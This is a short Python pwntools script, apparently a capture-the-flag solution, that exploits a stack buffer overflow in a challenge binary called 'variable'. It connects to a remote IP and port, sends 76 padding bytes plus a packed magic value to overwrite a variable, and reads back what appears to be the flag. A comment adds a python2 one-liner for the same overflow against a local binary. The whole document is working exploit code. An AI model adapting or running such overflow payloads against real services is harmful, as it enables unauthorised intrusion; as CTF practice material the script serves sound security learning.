from pwn import *

# r = process("./variable")

HOST, IP = '159.223.192.150', 9003

r = remote(HOST, IP)

payload = b'A'*76

payload += p64(0xcaf3bab3)

r.sendline(payload)
r.sendline("test")


print(r.recvuntil("}"))

# python2 one liner solution

# python2 -c "print 'A'*76 + '\xb3\xba\xf3\xca\x00\x00\x00\x00'" | ./challenge
